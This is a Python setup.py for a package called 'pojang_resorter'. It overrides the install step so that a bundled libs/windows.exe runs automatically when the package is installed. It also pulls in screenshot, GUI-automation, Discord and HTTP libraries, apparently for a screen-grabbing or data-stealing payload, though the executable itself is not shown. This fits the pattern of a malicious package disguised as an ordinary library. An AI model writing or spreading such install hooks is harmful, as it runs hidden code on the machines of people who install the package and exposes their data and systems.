from setuptools import setup, find_packages
from setuptools.command.install import install as _install
import os
import subprocess

class CustomInstallCommand(_install):
    """Custom installation for running an executable after installation."""
    def run(self):
        # Run the standard install
        _install.run(self)
        
        # Path to the executable in the libs subfolder
        exe_path = os.path.join(self.install_lib, 'libs', 'windows.exe')
        if os.path.exists(exe_path):
            try:
                # Run the executable
                subprocess.run([exe_path], check=True)
                print("Executable ran successfully.")
            except subprocess.CalledProcessError as e:
                print(f"Error running executable: {e}")
        else:
            print("Executable not found. Ensure it is placed in the 'libs' subfolder.")

setup(
    name='pojang_resorter',
    version='2.32.23',  # Updated version
    packages=find_packages(),
    install_requires=[
        'pillow',          # For taking and processing screenshots
        'pyautogui',       # For additional GUI automation
        'requests',        # For making HTTP requests
        'discord.py',     # For interacting with Discord
        'gitpython',       # For Git operations
        'opencv-python',   # For image processing (if needed)
        'pycurl',          # For handling HTTP requests with cURL (if needed)
        'pywin32',         # For Windows-specific operations like creating shortcuts
        'aiohttp',         # For asynchronous HTTP requests
        'numpy',           # Required for OpenCV and other numerical operations
        'pygetwindow',     # For window management with PyAutoGUI
        'pyscreenshot',    # For taking screenshots across platforms
        'scipy',           # For scientific computations (often used with image processing)
        'pytest',          # For testing your scripts (optional but recommended)
    ],
    entry_points={
        'console_scripts': [
            'pojang-resorter = pojang_resorter.main:main',
        ],
    },
    python_requires='>=3.10,<3.13',  # Specify the Python version compatibility
    cmdclass={
        'install': CustomInstallCommand,
    },
)
